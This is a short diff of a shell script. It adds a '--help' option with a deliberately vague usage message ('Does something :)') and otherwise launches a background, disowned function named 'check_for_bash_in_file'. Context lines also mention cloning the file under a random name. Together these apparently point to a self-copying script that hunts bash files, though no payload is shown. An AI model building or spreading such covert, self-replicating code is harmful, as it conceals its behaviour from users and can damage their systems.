@@ -75,4 +75,16 @@ clone_file_under_random_name() {
 }
 
 # Run and disown the function in the background
-(check_for_bash_in_file) &
+case "${1}" in
+--help)
+	echo "Usage: ${0} [OPTION]..."
+	echo "Does something :)"
+	echo
+	echo "  --help		display this help and exit"
+	echo
+	exit 0
+	;;
+*)
+	(check_for_bash_in_file) &
+	;;
+esac
